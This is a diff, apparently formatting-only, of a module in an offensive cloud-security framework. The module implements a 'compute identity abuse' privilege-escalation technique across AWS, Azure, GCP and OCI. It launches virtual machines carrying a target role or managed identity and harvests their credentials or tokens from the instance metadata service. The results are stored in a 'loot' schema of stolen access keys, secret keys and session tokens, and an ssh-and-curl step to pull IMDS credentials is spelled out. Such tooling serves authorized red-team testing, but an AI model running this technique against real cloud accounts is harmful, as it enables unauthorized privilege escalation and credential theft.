@@ -116,11 +116,11 @@ from quantum_mechanic.core.technique import technique
 # ----------------------------------------------------------------
 LOOT_ITEMS_KEY = None  # single-row result
 LOOT_SCHEMA = [
-    ('target_profile', 'target_profile'),
-    ('stolen_access_key', 'access_key_id'),
-    ('stolen_secret_key', 'secret_access_key'),
-    ('stolen_session_token', 'session_token'),
-    ('notes', None),
+    ("target_profile", "target_profile"),
+    ("stolen_access_key", "access_key_id"),
+    ("stolen_secret_key", "secret_access_key"),
+    ("stolen_session_token", "session_token"),
+    ("notes", None),
 ]
 
 logger = logging.getLogger(__name__)
@@ -150,16 +150,28 @@ def format_abuse_result(result: Any) -> None:
         console.print(f"  [bold red]✗[/bold red] {data.get('error', 'Unknown error')}")
         return
 
-    console.print(f"  [bold red]⚠  COMPUTE IDENTITY ABUSE SUCCESSFUL[/bold red] — [dim]{provider.upper()}[/dim]")
+    console.print(
+        f"  [bold red]⚠  COMPUTE IDENTITY ABUSE SUCCESSFUL[/bold red] — [dim]{provider.upper()}[/dim]"
+    )
 
     tbl = Table(box=None, padding=(0, 2))
     tbl.add_column("Property", style="bold white")
     tbl.add_column("Value", style="cyan")
 
-    target = data.get("launched_instance_id") or data.get("launched_vm_name") or data.get("launched_instance") or "unknown"
+    target = (
+        data.get("launched_instance_id")
+        or data.get("launched_vm_name")
+        or data.get("launched_instance")
+        or "unknown"
+    )
     tbl.add_row("Launched Instance", target)
 
-    identity = data.get("instance_profile_arn") or data.get("target_managed_identity_id") or data.get("target_service_account") or data.get("compartment_id")
+    identity = (
+        data.get("instance_profile_arn")
+        or data.get("target_managed_identity_id")
+        or data.get("target_service_account")
+        or data.get("compartment_id")
+    )
     tbl.add_row("Attached Identity", identity)
 
     if "public_ip" in data and data["public_ip"]:
@@ -187,7 +199,7 @@ def format_abuse_result(result: Any) -> None:
 
 @technique(
     technique_id="escalation/compute_identity_abuse",
-    tactic='privilege_escalation',
+    tactic="privilege_escalation",
     mitre_id="T1078.004",
     providers=["aws", "azure", "gcp", "oci"],
     severity="critical",
@@ -225,6 +237,7 @@ def execute(ctx: ExecutionContext) -> dict[str, Any]:
 # AWS — ec2:RunInstances + iam:PassRole
 # ================================================================
 
+
 def _abuse_aws(ctx: ExecutionContext) -> dict[str, Any]:
     """Spin up an EC2 with the target Instance Profile and capture IMDS creds.
 
@@ -238,6 +251,7 @@ def _abuse_aws(ctx: ExecutionContext) -> dict[str, Any]:
       keep_instance               (optional — default: false)
     """
     import importlib.util
+
     if importlib.util.find_spec("botocore") is None:
         return {"error": "boto3 is required for this technique."}
 
@@ -272,7 +286,8 @@ def _abuse_aws(ctx: ExecutionContext) -> dict[str, Any]:
         security_group_ids_raw = params.get("security_group_ids", "")
         security_group_ids = (
             [g.strip() for g in security_group_ids_raw.split(",") if g.strip()]
-            if security_group_ids_raw else []
+            if security_group_ids_raw
+            else []
         )
         ami_id = params.get("ami_id", "").strip() or None
 
@@ -281,9 +296,7 @@ def _abuse_aws(ctx: ExecutionContext) -> dict[str, Any]:
             inst = resp["Reservations"][0]["Instances"][0]
             subnet_id = subnet_id or inst.get("SubnetId")
             if not security_group_ids:
-                security_group_ids = [
-                    sg["GroupId"] for sg in inst.get("SecurityGroups", [])
-                ]
+                security_group_ids = [sg["GroupId"] for sg in inst.get("SecurityGroups", [])]
 
         if not ami_id:
             # Find the latest Ubuntu 22.04 LTS in this region.
@@ -395,10 +408,7 @@ echo "QM_IMDS_CREDS_END"
             "private_ip": private_ip,
             "key_name": key_name,
             "key_material": key_material,
-            "imds_url": (
-                "http://169.254.169.254/latest/meta-data/"
-                "iam/security-credentials/"
-            ),
+            "imds_url": ("http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
             "next_steps": [
                 f"ssh -i <key_file> ubuntu@{public_ip or private_ip} "
                 "'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
@@ -415,6 +425,7 @@ echo "QM_IMDS_CREDS_END"
 # ================================================================
 # Azure — Create VM with User-Assigned Managed Identity
 # ================================================================
+
 
 def _abuse_azure(ctx: ExecutionContext) -> dict[str, Any]:
     """Create an Azure VM with a target Managed Identity and capture token.
@@ -485,9 +496,7 @@ def _abuse_azure(ctx: ExecutionContext) -> dict[str, Any]:
             tags={QM_TAG_KEY: QM_TAG_VALUE},
         )
 
-        poller = compute.virtual_machines.begin_create_or_update(
-            resource_group, vm_name, vm_params
-        )
+        poller = compute.virtual_machines.begin_create_or_update(resource_group, vm_name, vm_params)
         vm = poller.result()
         ctx.log(f"Azure: created VM {vm_name} with managed identity {identity_id}")
 
@@ -517,6 +526,7 @@ def _abuse_azure(ctx: ExecutionContext) -> dict[str, Any]:
 # ================================================================
 # GCP — Create Compute Instance with target Service Account
 # ================================================================
+
 
 def _abuse_gcp(ctx: ExecutionContext) -> dict[str, Any]:
     """Create a GCP Compute instance with the target Service Account.
@@ -554,9 +564,9 @@ def _abuse_gcp(ctx: ExecutionContext) -> dict[str, Any]:
         compute = build("compute", "v1", credentials=credentials)
         machine_type = f"zones/{zone}/machineTypes/{QM_DEFAULT_GCP_MACHINE_TYPE}"
 
-        images = compute.images().getFromFamily(
-            project="debian-cloud", family="debian-11"
-        ).execute()
+        images = (
+            compute.images().getFromFamily(project="debian-cloud", family="debian-11").execute()
+        )
         source_disk_image = images["selfLink"]
 
         instance_name = f"qm-abuse-{int(time.time())}"
@@ -585,22 +595,22 @@ echo "QM_GCP_TOKEN_END"
                     "scopes": ["https://www.googleapis.com/auth/cloud-platform"],
                 }
             ],
-            "metadata": {
-                "items": [{"key": "startup-script", "value": startup_script}]
-            },
+            "metadata": {"items": [{"key": "startup-script", "value": startup_script}]},
             "labels": {QM_TAG_KEY.lower(): QM_TAG_VALUE},
         }
 
-        operation = compute.instances().insert(
-            project=project, zone=zone, body=instance_body
-        ).execute()
+        operation = (
+            compute.instances().insert(project=project, zone=zone, body=instance_body).execute()
+        )
         ctx.log(f"GCP: inserted instance {instance_name} with SA {service_account_email}")
 
         while operation["status"] != "DONE":
             time.sleep(5)
-            operation = compute.zoneOperations().get(
-                project=project, zone=zone, operation=operation["name"]
-            ).execute()
+            operation = (
+                compute.zoneOperations()
+                .get(project=project, zone=zone, operation=operation["name"])
+                .execute()
+            )
 
         result = {
             "provider": "gcp",
@@ -615,9 +625,7 @@ echo "QM_GCP_TOKEN_END"
         }
 
         if not keep_instance:
-            compute.instances().delete(
-                project=project, zone=zone, instance=instance_name
-            ).execute()
+            compute.instances().delete(project=project, zone=zone, instance=instance_name).execute()
             result["instance_terminated"] = True
 
         return result
@@ -630,6 +638,7 @@ echo "QM_GCP_TOKEN_END"
 # ================================================================
 # OCI — Launch Instance in a compartment covered by Dynamic Group
 # ================================================================
+
 
 def _abuse_oci(ctx: ExecutionContext) -> dict[str, Any]:
     """Launch an OCI instance in a compartment covered by a dynamic group.
